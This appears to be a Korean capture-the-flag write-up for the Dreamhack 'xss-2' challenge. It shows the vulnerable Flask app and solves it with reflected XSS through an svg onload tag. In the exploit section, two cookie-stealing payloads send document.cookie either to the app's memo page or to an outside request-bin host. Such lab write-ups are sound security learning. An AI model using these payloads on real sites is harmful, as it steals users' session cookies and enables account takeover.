# [Dreamhack Wargame] xss-2
### [🚩xss-2](https://dreamhack.io/wargame/challenges/268/)
  <img width="1066" alt="xss-2_description" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/8850b99f-06b6-49e4-9f1f-ab7e6ff70d05">

<br/><br/>

## 문제 파일(app.py) 분석
```python
#!/usr/bin/python3
from flask import Flask, request, render_template
from selenium import webdriver
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"


def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome("/chromedriver", options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True


def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}" # param의 값을 가져와 /vuln 엔드포인트에 접속하는 URL를 생성함
    return read_url(url, cookie) # 생성된 url과 쿠키를 인자로 주어 read_url 함수를 호출함



# 인덱스 페이지
@app.route("/")
def index():
    return render_template("index.html") # 인덱스 페이지(index.html)를 화면에 출력함



# vuln 페이지: 이용자가 전달한 값을 화면에 출력함
@app.route("/vuln")
def vuln():
    return render_template("vuln.html") # render_template 함수로 vuln 페이지(vuln.html)를 출력함



# flag 페이지
@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET": # GET 메소드로 요청 시
        return render_template("flag.html") # 이용자에게 URL을 입력받는 페이지(flag.html)를 화면에 출력함
    elif request.method == "POST": # POST 메소드로 요청 시
        param = request.form.get("param") # 이용자가 전달한 param 인자를 가져옴
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}): # param 파라미터에 {"flag": FLAG }를 포함하여 check_xss 함수를 호출함
            return '<script>alert("wrong??");history.go(-1);</script>' # check_xss 결과 false를 반환할 경우 "wrong??" 알림창 출력

        return '<script>alert("good");history.go(-1);</script>' # check_xss 결과 true를 반환할 경우 "good" 알림창 출력



memo_text = ""

# memo 페이지: 이용자가 메모를 남길 수 있으며, 작성한 메모를 출력함
@app.route("/memo")
def memo():
    global memo_text # memo_text 변수를 전역 변수로 참조함
    text = request.args.get("memo", "") # 이용자가 /memo?memo= 뒤에 입력한 memo 값을 가져옴
    memo_text += text + "\n" # 이용자가 전송한 memo 입력값을 memo_text에 추가함
    return render_template("memo.html", memo=memo_text) # 사이트에 저장된 memo_text를 화면에 출력함



app.run(host="0.0.0.0", port=8000)
```


<br/><br/>


## 문제 풀이
### 취약점이 존재하는 코드
* xss-1 문제와 달리 /vuln 엔드포인트에서 ```render_template``` 함수를 사용하여 HTML 엔티티 코드로 변환해 저장함
* XSS 우회를 사용해서 익스플로잇 코드를 작성해야 XSS 공격(Reflected XSS)에 성공할 수 있음
	- [Cross-site Scripting Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) 사이트를 이용해 XSS 우회 방법을 체크함
		+ 크롬 브라우저에서 사용할 수 있는 XSS 우회 방법 중 ```<svg>``` 태그를 이용한 방법을 사용
		  <img width="1589" alt="Cheat Sheat(svg)" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/71cfa54d-815a-4c48-9ed3-671e86202eb0">
		  - flag 엔드포인트에서 ```<svg onload=alert(1)>```를 입력하고 [제출] 버튼을 누르면 “good” 알림창이 뜨면서 XSS 발생을 확인할 수 있음
		  	<img width="918" alt="svg 태그 체크" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/bdf82947-b3d8-4be4-b34a-2251021e2dbb">
			<img width="918" alt="svg 태그 체크 결과" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/81c09f3a-fe7b-4c4c-88d9-bda7d6828f8f">

<br/><br/>

## 익스플로잇
#### 방법 1: memo 페이지 이용
1. flag 엔드포인트에서 ```<svg onload=“location.href=‘/memo?memo=‘+document.cookie;”>```를 입력하고 [제출] 버튼을 클릭함
	<img width="918" alt="memo 페이지_1" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/66be4fdd-9b6a-40e7-9dd1-3b118d97591b">

2. “good” 알림창이 출력되면 memo 페이지로 이동하여 화면에 출력된 임의 이용자의 쿠키 정보(FLAG)를 획득할 수 있음
	<img width="918" alt="memo 페이지_2" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/dc6efc2d-9040-437e-8728-6d25fa37b425">

<br/>

#### 방법 2: 외부 웹 서버 이용
1. 외부에서 접근 가능한 웹 서버를 준비함
	- Dreamhack에서 제공하는 [드림핵툴즈 서비스](https://tools.dreamhack.games)의 Request Bin 기능을 이용함
		+ Request Bin 항목에서 랜덤한 URL이 생성되는 것을 확인하고 이를 복사해둠
	<img width="1589" alt="외부 웹 서버_1" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/c7204d8e-5387-4a34-ba6e-5e11ccab8479">

2. flag 엔드포인트에서 ```<svg onload=“location.href=‘http://RANDOMHOST.request.dreamhack.games/?memo='+document.cookie;">```를 입력하고 [제출] 버튼을 클릭함
	<img width="918" alt="외부 웹 서버_2" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/e5f20769-eb83-4a90-85f4-7f63bbf65169">

3. “good” 알림창이 출력되면 웹 서버의 접속 기록을 확인하여 QueryString 부분에서 임의 이용자의 쿠키 정보(FLAG)를 획득할 수 있음
	<img width="1589" alt="외부 웹 서버_3" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/518859a3-b273-492a-895a-260a303eefde">

